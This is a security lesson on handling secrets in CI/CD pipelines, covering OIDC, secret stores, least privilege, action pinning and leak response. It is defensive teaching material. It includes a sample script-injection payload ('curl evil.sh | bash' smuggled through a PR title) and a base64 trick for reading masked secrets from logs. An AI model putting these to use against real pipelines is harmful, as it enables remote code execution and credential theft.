Secrets in Pipelines

A CI/CD pipeline is the most privileged automation in your company: it can read your source, publish to your registry and deploy to production. That makes it one of the most attractive targets for attackers. This lesson covers how to give pipelines the access they need, and nothing more.

Why this matters

Recent supply-chain incidents share a pattern: attackers did not break production, they broke the path to production. In 2021 a flaw in Codecov's uploader script exfiltrated CI environment variables from thousands of customers. In 2023 a breach at CircleCI forced customers to rotate every secret stored there. In 2025 the compromise of the popular tj-actions/changed-files GitHub Action leaked secrets from the logs of many repositories that used it by a mutable tag. In each case, a long-lived credential sitting in a pipeline was the prize.

The lesson is a design principle: assume the pipeline will, at some point, run something you did not intend (a malicious dependency, a compromised action, a hostile pull request), and limit the damage in advance.

What counts as a secret

  • API keys, tokens, passwords, database credentials.
  • Cloud access keys; SSH private keys; signing keys (GPG, cosign, code-signing certificates).
  • Registry and package-publishing tokens (npm, PyPI, Docker Hub).
  • Webhook URLs with embedded tokens, and anything that grants access when leaked.

Configuration (a region name, a hostname) is not secret; keep it as plain variables so it is visible and diffable.

The hierarchy of approaches (best to worst)

  1. No secret at all: workload identity / OIDC. The pipeline proves who it is; the cloud issues short-lived credentials.
  2. Fetch short-lived secrets at runtime from a dedicated secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault), authenticated via OIDC.
  3. CI platform secret store (GitHub/GitLab secrets), scoped to environments and rotated regularly.
  4. Hard-coded in the repo or in the image. Never. Not even in a private repo.

OIDC: replacing long-lived keys

With OpenID Connect federation, each job gets a signed JWT from the CI provider containing claims about the run. The cloud verifies the signature and claims against a trust policy and returns temporary credentials (typically valid about an hour).

 CI job ──(1) request OIDC token──▶ CI provider (token.actions.githubusercontent.com)
   │◀──(2) JWT: iss, sub="repo:acme/shop:ref:refs/heads/main", aud, exp ──┘
   │
   └─(3) present JWT ──▶ Cloud STS (AWS / GCP / Azure)
                           │ validates signature + trust policy conditions on sub/aud
   ◀─(4) temporary credentials (expire in ~1 hour) ─────┘
   └─(5) call cloud APIs with them

AWS trust policy for the role assumed by GitHub Actions, scoped to one repo and branch:

{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:acme/shop:environment:production"
      }
    }
  }]
}

Always constrain sub. An unconstrained trust policy lets any GitHub repository assume your role. GitLab (id_tokens), Bitbucket, CircleCI and others support the same pattern.

Why OIDC wins

A leaked OIDC-derived credential expires in an hour and is bound to one repo and environment. A leaked static AWS_SECRET_ACCESS_KEY works from anywhere, forever, until somebody notices.

Using the platform secret store correctly

GitHub

steps:
  - name: Call API
    env:
      API_TOKEN: ${{ secrets.API_TOKEN }}      # expose to ONE step, via env
    run: curl -fsS -H "Authorization: Bearer $API_TOKEN" https://api.example.com/deploy
  • Scope: organisation, repository, or environment secrets. Prefer environment secrets for production: they are released only to jobs that reference that environment and pass its protection rules.
  • Secrets are not passed to workflows triggered from forked PRs (a deliberate protection). Do not circumvent it with pull_request_target plus checkout of PR code.
  • Limit the scope of the secret to the step that needs it, not the whole job, and never to the whole workflow.

GitLab

  • Mark variables Masked and Protected (only on protected branches/tags), and scope them to an environment (production).
  • Use the secrets: keyword with HashiCorp Vault, Azure Key Vault, GCP Secret Manager or AWS integrations via ID tokens.

Jenkins

  • Use the Credentials store with withCredentials; scope credentials to folders; avoid echoing them, and prefer single-quoted sh '...' so Groovy does not interpolate secrets into command lines.

Masking: helpful but not a security boundary

CI systems replace known secret values in logs with ***. This stops accidental exposure, but:

  • It only matches the exact string. Base64, URL-encoded, split, reversed or sliced values slip through.
  • Anyone able to modify the workflow can simply echo "$SECRET" | base64 and read it from the log. Whoever can edit the pipeline can read the secrets it receives. Hence CODEOWNERS and required reviews on pipeline files.
  • Multi-line secrets and structured JSON often need per-line masking registration (::add-mask:: in GitHub).
  • set -x and verbose flags (curl -v, docker --debug) can print credentials.

Least privilege

  • Separate identities per purpose: a CI role that can push to the registry should not be able to deploy; the deploy role should not be able to modify IAM.
  • Per environment: staging credentials cannot touch production. A compromised PR pipeline must not reach prod.
  • Scoped tokens: a registry token limited to one repository with push-only rights; a deploy key (read-only) rather than a personal access token tied to a person.
  • GITHUB_TOKEN: set permissions: contents: read at the top and grant extra (packages: write, id-token: write) only to the jobs needing them. GitHub lets you set the repository default to read-only.
  • No personal credentials in pipelines; use service accounts, so offboarding a person does not break deploys and so audit logs make sense.
  • Short TTLs and rotation: rotate static secrets on a schedule and immediately after any suspected exposure.

Also protect against script injection. This is vulnerable:

# BAD: attacker names the PR:  a"; curl evil.sh | bash; echo "
- run: echo "PR title is ${{ github.event.pull_request.title }}"

# GOOD: pass through an environment variable; the shell treats it as data
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $TITLE"

Supply-chain risks and pinning

Every uses:, include:, orb, plugin, base image and npm install is third-party code running with your pipeline's privileges.

  • Pin actions to a full commit SHA, with a comment for humans. Tags and branches are mutable; a maintainer account takeover can repoint v4 to malware. 
    - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
    Use Dependabot or Renovate to bump pinned SHAs via reviewed PRs. Actions published by GitHub or well-known orgs carry lower (not zero) risk than random Marketplace actions; fork or vendor critical ones.
  • Pin container images by digest (node:22-alpine@sha256:...) for builds that matter, and rebuild regularly for security patches.
  • Lockfiles and integrity hashes for dependencies; install with npm ci, pip install --require-hashes, go mod verify.
  • Do not curl | bash installers inside pipelines without pinning and checksum verification.
  • Restrict network egress on runners where feasible (tools like StepSecurity Harden-Runner), so a compromised step cannot phone home.
  • Ephemeral runners. Self-hosted runners that persist between jobs leak files and credentials from one job to the next; use one-job-per-VM/pod.
  • Generate provenance and sign artifacts (SLSA provenance, Sigstore cosign, GitHub artifact attestations) so deploy-time checks can verify an image was built by your pipeline from a specific commit.
  • Beware of cache poisoning: a PR job that writes to a cache later restored by a privileged main-branch job can inject code. Scope caches by branch or do not restore PR caches in release jobs.

Secrets that must not end up in the artifact

  • Do not bake secrets into Docker images with ARG/ENV; they persist in layers and docker history. Use BuildKit secret mounts: 
    docker build --secret id=npmrc,src=$HOME/.npmrc .
# Dockerfile:
# RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci
  • Inject runtime secrets at deploy time (Kubernetes Secrets synced from a manager via External Secrets Operator or CSI driver; docker run --env-file), never at build time.

Detecting leaks and responding

  • Enable secret scanning with push protection (GitHub) or secret detection (GitLab), and run gitleaks/trufflehog in CI and as a pre-commit hook.
  • If a secret leaks, treat it as compromised: revoke and rotate first, then clean up history (history rewrites do not un-leak something already cloned or scraped), then audit logs for use of the credential.
  • Keep an inventory of what secrets exist, who owns them and when they were last rotated.

Checklist

No long-lived cloud keys in CI. Default token read-only. Environment-scoped, protected secrets. Fork PRs get nothing. Actions pinned by SHA. Pipeline files under CODEOWNERS. Ephemeral runners. Secret scanning on. Rotation procedure written down and practiced.

Try it

  1. Audit one repo: list every secret in its CI settings. For each, who created it, does it expire, can it be replaced with OIDC?
  2. Set up GitHub OIDC to a free-tier cloud account with a trust policy restricted to one repo and environment. Verify that a different repo cannot assume the role.
  3. Run gitleaks detect on your repo and its history.
  4. Pin all actions in a workflow to SHAs and add a Dependabot github-actions ecosystem entry to keep them current.
